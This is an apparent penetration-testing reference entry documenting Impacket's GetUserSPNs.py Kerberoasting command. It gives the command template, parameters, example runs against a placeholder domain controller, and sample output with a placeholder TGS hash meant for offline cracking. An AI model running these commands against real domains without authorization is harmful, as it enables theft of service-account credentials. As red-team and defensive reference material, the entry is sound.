---
id: cfe8a48e-084c-42b7-b6b5-b66fba573639
name: getuserspns-query-spns-and-request-tgs
type: command
executor: bash
data: >-
  GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_TARGET_IP -request
  -outputfile $_OUTPUT_FILE.txt
output: >-
  ServicePrincipalName  Name  MemberOf  PasswordLastSet  LastLogon

  host/CIFS:445  serviceaccount  CN=Users,DC=domain,DC=com  2023-01-01 12:00:00 
  2023-01-02 12:00:00

  $krb5tgs$23$*serviceaccount$DOMAIN$host/CIFS:445*$hash1$hash2
created_at: '2019-12-04T19:39:54.379187+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
  - Windows
tags:
  - kerberoasting
  - spn
verified: true
validated: true
---

# getuserspns-query-spns-and-request-tgs

## Command

```bash
GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_TARGET_IP -request -outputfile $_OUTPUT_FILE.txt
```

## Description

This command uses Impacket's GetUserSPNs.py to query Active Directory for Service Principal Names (SPNs) associated with user accounts using provided credentials. It then requests Ticket Granting Service (TGS) tickets for those SPNs, generating crackable Kerberos hashes suitable for offline brute-force attacks with tools like Hashcat or John the Ripper. This is a key step in Kerberoasting attacks to target service accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| '$_DOMAIN/$_USERNAME:$_PASSWORD' | Domain credentials in the format domain/username:password for authenticating to the domain controller | Yes |
| -dc-ip $_TARGET_IP | IP address of the target domain controller | Yes |
| -request | Flag to automatically request TGS tickets for discovered SPNs, enabling Kerberoasting | Yes |
| -outputfile $_OUTPUT_FILE.txt | Optional file path to save the output, including SPN details and generated hashes | No |

## Examples

### Basic Usage

```bash
GetUserSPNs.py 'corp.local/user:pass' -dc-ip 10.10.10.10 -request
```

### Advanced Usage

With file output for later cracking:

```bash
GetUserSPNs.py 'corp.local/user:pass' -dc-ip 10.10.10.10 -request -outputfile tgs_hashes.txt
```

## Expected Output

The command outputs a table of discovered SPNs followed by the generated TGS hashes in a crackable format:

```
ServicePrincipalName  Name           MemberOf                   PasswordLastSet    LastLogon
host/CIFS:445       serviceaccount  CN=Users,DC=corp,DC=local  2023-01-01 12:00:00  2023-01-02 12:00:00
$krb5tgs$23$*serviceaccount$CORP.LOCAL$host/CIFS:445*$hash1$hash2
```

Success is indicated by the presence of TGS hashes (starting with $krb5tgs$), which can be extracted and cracked offline.

## Related

- [[procedures/Query-Domain-for-SPNS-and-Kerberoast-Authenticated]]
- [[tools/GetUserSPNs.py-(Impacket)]]
